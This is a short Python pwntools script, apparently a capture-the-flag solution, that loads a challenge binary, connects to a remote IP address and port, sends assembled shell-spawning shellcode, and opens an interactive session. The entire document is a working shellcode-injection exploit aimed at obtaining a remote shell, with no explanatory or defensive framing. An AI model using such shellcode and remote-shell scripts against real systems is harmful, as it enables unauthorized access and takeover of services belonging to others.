from pwn import *

exe = context.binary = ELF('chall')
io = remote('65.0.128.220', 32627) #exe.process()
payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
